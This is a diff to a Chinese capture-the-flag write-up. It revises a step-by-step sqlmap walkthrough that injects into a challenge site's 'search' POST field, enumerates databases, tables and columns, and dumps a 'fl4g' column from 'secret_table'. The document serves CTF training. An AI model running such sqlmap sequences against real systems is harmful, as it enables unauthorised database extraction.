@@ -178,22 +178,9 @@ URL中自动携带参数`id=1`, 将`id=1`改成`id=flag`, 自动跳回到`id=1`,
     [sqlmap](http://sqlmap.org/): 自动化SQL注入工具
 
     1. 测试数据库类型及是否存在注入, 获取列数`python3 sqlmap.py -u "http://111.198.29.45:53232/index.php" --data "search=df"`
-    1.获取注入点
+    1. 获取数据库名称`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" --dbs`
+    1. 获取指定数据库表名称`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news --tables`
+    1. 获取表内字段信息`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table --columns`
+    1. 获取字段内容，得到flag: `python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table -C fl4g --dump`
 
-    sqlmap -u http://192.168.100.161:53459 --data "search=df"
-
-    2.获取数据库信息
-
-    sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
-
-    3.获取库内表信息
-
-    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
-
-    4.获取表内字段信息
-
-    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
-
-    5.获取字段内容，得到flag
-
-    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
+    参考链接: <https://github.com/sqlmapproject/sqlmap/wiki/Usage>
